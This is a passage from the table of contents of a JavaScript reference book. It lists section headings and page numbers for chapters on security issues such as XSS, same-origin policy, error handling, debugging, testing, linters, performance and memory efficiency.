[421](#chapter-95-security-issues)](#chapter-95-security-issues)

[Section 95.1: Reflected Cross-site scripting (XSS)
[421](#section-95.1-reflected-cross-site-scripting-xss)](#section-95.1-reflected-cross-site-scripting-xss)

[Section 95.2: Persistent Cross-site scripting (XSS)
[422](#section-95.2-persistent-cross-site-scripting-xss)](#section-95.2-persistent-cross-site-scripting-xss)

[Section 95.3: Persistent Cross-site scripting from JavaScript string
literals
[423](#section-95.3-persistent-cross-site-scripting-from-javascript-string-literals)](#section-95.3-persistent-cross-site-scripting-from-javascript-string-literals)

[Section 95.4: Why scripts from other people can harm your website and
its visitors
[423](#section-95.4-why-scripts-from-other-people-can-harm-your-website-and-its-visitors)](#section-95.4-why-scripts-from-other-people-can-harm-your-website-and-its-visitors)

[Section 95.5: Evaled JSON injection
[424](#section-95.5-evaled-json-injection)](#section-95.5-evaled-json-injection)

[**Chapter 96: Same Origin Policy & Cross-Origin Communication**
[426](#chapter-96-same-origin-policy-crossorigin-communication)](#chapter-96-same-origin-policy-crossorigin-communication)

[Section 96.1: Safe cross-origin communication with messages
[426](#section-96.1-safe-cross-origin-communication-with-messages)](#section-96.1-safe-cross-origin-communication-with-messages)

[Section 96.2: Ways to circumvent Same-Origin Policy
[427](#section-96.2-ways-to-circumvent-same-origin-policy)](#section-96.2-ways-to-circumvent-same-origin-policy)

[**Chapter 97: Error Handling**
[429](#chapter-97-error-handling)](#chapter-97-error-handling)

[Section 97.1: Error objects
[429](#section-97.1-error-objects)](#section-97.1-error-objects)

[Section 97.2: Interaction with Promises
[429](#section-97.2-interaction-with-promises)](#section-97.2-interaction-with-promises)

[Section 97.3: Error types
[430](#section-97.3-error-types)](#section-97.3-error-types)

[Section 97.4: Order of operations plus advanced thoughts
[430](#section-97.4-order-of-operations-plus-advanced-thoughts)](#section-97.4-order-of-operations-plus-advanced-thoughts)

[**Chapter 98: Global error handling in browsers**
[433](#chapter-98-global-error-handling-in-browsers)](#chapter-98-global-error-handling-in-browsers)

[Section 98.1: Handling window.onerror to report all errors back to the
server-side
[433](#section-98.1-handling-window.onerror-to-report-all-errors-back-to-the-server-side)](#section-98.1-handling-window.onerror-to-report-all-errors-back-to-the-server-side)

[**Chapter 99: Debugging**
[435](#chapter-99-debugging)](#chapter-99-debugging)

[Section 99.1: Interactive interpreter variables
[435](#section-99.1-interactive-interpreter-variables)](#section-99.1-interactive-interpreter-variables)

[Section 99.2: Breakpoints
[435](#section-99.2-breakpoints)](#section-99.2-breakpoints)

[Section 99.3: Using setters and getters to find what changed a property
[436](#section-99.3-using-setters-and-getters-to-find-what-changed-a-property)](#section-99.3-using-setters-and-getters-to-find-what-changed-a-property)

[Section 99.4: Using the console
[437](#section-99.4-using-the-console)](#section-99.4-using-the-console)

[Section 99.5: Automatically pausing execution
[438](#section-99.5-automatically-pausing-execution)](#section-99.5-automatically-pausing-execution)

[Section 99.6: Elements inspector
[438](#section-99.6-elements-inspector)](#section-99.6-elements-inspector)

[Section 99.7: Break when a function is called
[438](#section-99.7-break-when-a-function-is-called)](#section-99.7-break-when-a-function-is-called)

[Section 99.8: Stepping through code
[439](#section-99.8-stepping-through-code)](#section-99.8-stepping-through-code)

[**Chapter 100: Unit Testing JavaScript**
[440](#chapter-100-unit-testing-javascript)](#chapter-100-unit-testing-javascript)

[Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and
Proxyquire
[440](#section-100.1-unit-testing-promises-with-mocha-sinon-chai-and-proxyquire)](#section-100.1-unit-testing-promises-with-mocha-sinon-chai-and-proxyquire)

[Section 100.2: Basic Assertion
[442](#section-100.2-basic-assertion)](#section-100.2-basic-assertion)

[<b>Chapter 101: Evaluating JavaScript</b>
[444](#chapter-101-evaluating-javascript)](#chapter-101-evaluating-javascript)

[Section 101.1: Evaluate a string of JavaScript statements
[444](#section-101.1-evaluate-a-string-of-javascript-statements)](#section-101.1-evaluate-a-string-of-javascript-statements)

[Section 101.2: Introduction
[444](#section-101.2-introduction)](#section-101.2-introduction)

[Section 101.3: Evaluation and Math
[444](#section-101.3-evaluation-and-math)](#section-101.3-evaluation-and-math)

[<b>Chapter 102: Linters - Ensuring code quality</b>
[445](#chapter-102-lintersensuring-code-quality)](#chapter-102-lintersensuring-code-quality)

[Section 102.1: JSHint
[445](#section-102.1-jshint)](#section-102.1-jshint)

[Section 102.2: ESLint / JSCS
[446](#section-102.2-eslint-jscs)](#section-102.2-eslint-jscs)

[Section 102.3: JSLint
[446](#section-102.3-jslint)](#section-102.3-jslint)

[<b>Chapter 103: Anti-patterns</b>
[447](#chapter-103-anti-patterns)](#chapter-103-anti-patterns)

[Section 103.1: Chaining assignments in var declarations
[447](#section-103.1-chaining-assignments-in-var-declarations)](#section-103.1-chaining-assignments-in-var-declarations)

[<b>Chapter 104: Performance Tips</b>
[448](#chapter-104-performance-tips)](#chapter-104-performance-tips)

[Section 104.1: Avoid try/catch in performance-critical functions
[448](#section-104.1-avoid-trycatch-in-performance-critical-functions)](#section-104.1-avoid-trycatch-in-performance-critical-functions)

[Section 104.2: Limit DOM Updates
[448](#section-104.2-limit-dom-updates)](#section-104.2-limit-dom-updates)

[Section 104.3: Benchmarking your code - measuring execution time
[449](#section-104.3-benchmarking-your-codemeasuring-execution-time)](#section-104.3-benchmarking-your-codemeasuring-execution-time)

[Section 104.4: Use a memoizer for heavy-computing functions
[451](#section-104.4-use-a-memoizer-for-heavy-computing-functions)](#section-104.4-use-a-memoizer-for-heavy-computing-functions)

[Section 104.5: Initializing object properties with null
[453](#section-104.5-initializing-object-properties-with-null)](#section-104.5-initializing-object-properties-with-null)

[Section 104.6: Reuse objects rather than recreate
[454](#section-104.6-reuse-objects-rather-than-recreate)](#section-104.6-reuse-objects-rather-than-recreate)

[Section 104.7: Prefer local variables to globals, attributes, and
indexed values
[455](#section-104.7-prefer-local-variables-to-globals-attributes-and-indexed-values)](#section-104.7-prefer-local-variables-to-globals-attributes-and-indexed-values)

[Section 104.8: Be consistent in use of Numbers
[456](#section-104.8-be-consistent-in-use-of-numbers)](#section-104.8-be-consistent-in-use-of-numbers)

[<b>Chapter 105: Memory efficiency</b>
[458](#chapter-105-memory-eciency)](#chapter-105-memory-eciency)

[Section 105.1: Drawback of creating true private method
[458](#section-105.1-drawback-of-creating-true-private-method)](#section-105.1-drawback-of-creating-true-private-method)

[<b>Appendix A: Reserved Keywords</b>
[459](#appendix-a-reserved-keywords)](#appendix-a-reserved-keywords)

[Section A.1: Reserved Keywords
[459](#section-a.1-reserved-keywords)](#section-a.1-reserved-keywords)

[Section A.2: Identifiers & Identifier Names
[461](#section-a.2-identifiers-identifier-names)](#section-a.2-identifiers-identifier-names)

[<b>Credits</b> [463](#credits)](#credits)

[<b>You may also like</b> [474](#you-may-also-like)](#you-may-also-like)

